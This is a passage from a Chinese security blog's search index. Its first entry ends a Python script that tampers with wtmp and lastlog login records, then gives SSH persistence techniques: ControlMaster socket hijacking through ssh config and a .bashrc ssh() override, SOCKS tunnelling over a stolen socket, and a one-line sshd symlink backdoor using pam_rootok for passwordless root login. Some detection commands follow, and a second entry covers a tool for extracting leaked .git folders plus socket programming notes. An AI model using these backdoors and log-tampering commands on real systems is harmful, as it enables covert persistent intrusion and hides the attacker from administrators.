class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>         <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE             <span class="token comment"># tamper</span>            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>         <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE             <span class="token comment"># tamper</span>            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>====<br>更新：</p><p>上面的可以在debain系使用，感觉下面这种方法更通用：<br>有两种方式:</p><ol><li>修改<code>/etc/ssh/ssh_config</code>或者 <code>~/.ssh/config</code> 配置文件:</li></ol><p>Host *</p><p>ControlPath /tmp/%r@%h:%p<br>ControlMaster auto<br>ControlPersist yes</p><p>此时开启了Controlmaster模式，如果当前用户已经登录过一次目标机器，可以直接使用socket文件登录。</p><ol start="2"><li>直接修改~/.bashrc文件</li></ol><pre class="line-numbers language-none"><code class="language-none">ssh () &#123;     &#x2F;usr&#x2F;bin&#x2F;ssh -o &quot;ControlMaster&#x3D;auto&quot; -o &quot;ControlPath&#x3D;&#x2F;tmp&#x2F;%r@%h:%p&quot; -o &quot;ControlPersist&#x3D;yes&quot; &quot;$@&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用ssh登录的时候:</p><p><code>ssh -S root@x.x.x.x\:22 %h</code></p><p>===<br>进阶，未测试：</p><p>如果sockets文件存在，可以创建一个tunnel:</p><pre class="line-numbers language-none"><code class="language-none">lsof -i TCP:9090ssh -O forward -D 9090 -S &#x2F;tmp&#x2F;root@112.124.20.20\:22 %hlsof -i TCP:9090 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后就可以使用9090端口作为socks5代理。</p><p>检测方法:</p><ol><li>检查ssh配置文件里面，是否开启ContronMaster模式</li></ol><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;ssh&#x2F;ssh_config$HOME&#x2F;.ssh&#x2F;config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>检查bash自定义函数是否有ssh()劫持</li></ol><p><code>set|grep &quot;ssh()&quot;</code></p><p>========<br>再更新：</p><p>在linux里面有这么一句话，快速建立后门：</p><pre class="line-numbers language-none"><code class="language-none">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后 <code>ssh root@xxxxx -p 12345 </code>随便输入密码，即可获得root权限。</p><p>原理:</p><p><a href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/</a><br><a href="https://xianzhi.aliyun.com/forum/read/790.html">https://xianzhi.aliyun.com/forum/read/790.html</a></p><p>简单来说:在sshd服务配置运行pam认证的前提下，PAM配置文件中控制标示为sufficient时，只要pam_rootok模块检测uid为0即可成功登录。</p><p>注意点: </p><ul><li><code>/etc/ssh/sshd_config</code>里面要配置<code>UsePAM yes</code></li><li>可以更改软链接的位置，但是不能更改链接文件名<ul><li>ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345 成功</li><li>ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345 失败</li></ul></li><li>此类ssh后门核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能，可以自己添加</li></ul><pre class="line-numbers language-none"><code class="language-none">echo &quot;auth sufficient pam_rootok.so&quot; &gt;&gt; &#x2F;etc&#x2F;pam.d&#x2F;hackercat &#x2F;etc&#x2F;pam.d&#x2F;hackerln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;hacker;&#x2F;tmp&#x2F;hacker -oport&#x3D;12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只要文件中包含<code>auth sufficient pam_rootok.so</code>，即可无密码登录，可以在<code>/etc/pam.d</code>目录中查找这个配置:</p><pre class="line-numbers language-none"><code class="language-none">find .&#x2F; |xargs grep &quot;pam_rootok&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ubuntu 14里面如下的结果:</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;su:auth       sufficient pam_rootok.so.&#x2F;su:# permitted earlier by e.g. &quot;sufficient pam_rootok.so&quot;)..&#x2F;chfn:authsufficientpam_rootok.so.&#x2F;schroot:auth       sufficient pam_rootok.so.&#x2F;runuser:authsufficientpam_rootok.so.&#x2F;chsh:authsufficientpam_rootok.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Centos 6.7结果如下:</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;runuser:authsufficientpam_rootok.so.&#x2F;config-util:authsufficientpam_rootok.so.&#x2F;su:authsufficientpam_rootok.so.&#x2F;chfn:auth       sufficient   pam_rootok.so.&#x2F;setup:auth       sufficientpam_rootok.so.&#x2F;xserver:auth       sufficientpam_rootok.so.&#x2F;chsh:auth       sufficient   pam_rootok.so.&#x2F;poweroff:auth       sufficientpam_rootok.so.&#x2F;halt:auth       sufficientpam_rootok.so.&#x2F;wireshark:authsufficientpam_rootok.so.&#x2F;eject:auth       sufficientpam_rootok.so.&#x2F;reboot:auth       sufficientpam_rootok.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git folder exploit</title>
      <link href="/2016/03/30/git-folder-exploit.html"/>
      <url>/2016/03/30/git-folder-exploit.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/JKme/gitback">gitback.py</a></li></ul><p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p><p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p><p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p><h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul><li><a href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li><li><a href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li><li><a href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li></ul><p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p><h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p><ul><li><a href="http://stackoverflow.com/questions/16694907/how-to-download-large-file-in-python-with-requests-py">stackoverflow</a></li><li><a href="https://github.com/kennethreitz/requests/pull/1935/files">Issue</a></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>local_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> chunk <span class="token keyword">in</span> r<span class="token punctuation">.</span>iter_conteCnt<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> chunk<span class="token punctuation">:</span>               <span class="token comment"># filter out keep-alive new chunks</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>            <span class="token comment">#f.flush() commented by recommendation from J.F.Sebastian</span>    <span class="token keyword">return</span> local_filename<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="zlib解压缩"><a href="#zlib解压缩" class="headerlink" title="zlib解压缩"></a>zlib解压缩</h4><p> 在原有代码的基础上，使用<code>zlib.decompress(requests.reponse.raw.read())</code>来解压缩文件,本身设想把socket当作file来操作，但是未搞定。<br> 最后采用先下载压缩文件到本地，然后解压缩到对应文件。</p><h4 id="Socket流程"><a href="#Socket流程" class="headerlink" title="Socket流程"></a>Socket流程</h4><p>由于<code>gitback</code>在两个地方碰到了socket的问题：</p><ul><li>请求服务器发生<code>readtimeout</code>异常</li><li><code>zlib.decopress</code>解压缩是否可以解压缩socket，将socket作为文件来读</li></ul><p>首先来看以下socket的流程：首先服务端调用<code>socket()</code>创建一个socket，再将这个socket绑定<code>bind()</code>，绑定一个端口，调用listen来限制等待连接的队列容量，最后在循环中不停调用<code>accept()</code>来接收请求。</p><p>客户端通过<code>socket()</code>创建socket，再调用<code>connect()</code>连接到服务端bind的端口，这个时候如果等待连接的客户端超过<code>listen()</code>的设置，就会被拒绝，否则服务器接收这个<code>accept()</code>请求，并建立连接。<code>accet()</code>会返回新的socket，服务端和客户端都可以通过这个socket，调用<code>send()/recv()</code>或<code>write()/read()</code>进行通信。</p><p>来源：<a href="http://www.keakon.net/2011/09/28/%E5%85%B3%E4%BA%8Esocket%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%9D%E6%AD%A5%E7%A0%94%E7%A9%B6">http://www.keakon.net/2011/09/28/%E5%85%B3%E4%BA%8Esocket%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%9D%E6%AD%A5%E7%A0%94%E7%A9%B6</a></p><h4 id="阻塞与非阻塞"><a href="#阻塞与非阻塞" class="headerlink" title="阻塞与非阻塞"></a>阻塞与非阻塞</h4><p>阻塞(blocking)，简单来说就是**sleep(休眠)**的技术术语，由于CPU的速度比较快，寄存器、CPU缓存和内存还能跟上这个速度，但是换成硬盘、网络等访问时间在毫秒以上，造成CPU长时间空闲等待，于是造成阻塞。<br>如果在这些耗费时间较长的I/O访问时，CPU处理完之后立即返回处理其他事情，让设备自行连接、传输。并在结束后让CPU完成善后，这样就是非阻塞(non-blocking)，在C语言中可以通过<code>fcntl()</code>和<code>ioctl()</code>将socket设为非阻塞。</p><p>在非阻塞状态下，服务器可以异步处理I/O，最简单的就是死循环中遍历所有socket，此时如果试着读取non-blocking的socket，<strong>如果socket没有内容的时候，返回-1，并将errno设置为<code>EWOULDBLOCK</code></strong></p><p><code>select()</code>授予你同时监视多个socket的权利，它会告诉你哪里资料可以读取，那些可以写入，哪些触发了例外。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include    &lt;sys&#x2F;time.h&gt; #include    &lt;sys&#x2F;types.h&gt; #include    &lt;unistd.h&gt; int select (int numfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>readfds</code>，<code>writefds</code>, <code>excepfds</code>分别表示要监视的那一组file descriptor set。</p><p>至于<code>epoll</code>，异步IO这些以后再慢慢学，先留个概念。</p><p>来源:<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=zh-CN&amp;prev=search&amp;rurl=translate.google.com.sg&amp;sl=zh-TW&amp;u=http://beej-zhtw.netdpi.net/07-advanced-technology/7-2-select&amp;usg=ALkJrhg0zwDET71E2ri1ObOL_Xb3et8b8w">https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=zh-CN&amp;prev=search&amp;rurl=translate.google.com.sg&amp;sl=zh-TW&amp;u=http://beej-zhtw.netdpi.net/07-advanced-technology/7-2-select&amp;usg=ALkJrhg0zwDET71E2ri1ObOL_Xb3et8b8w</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
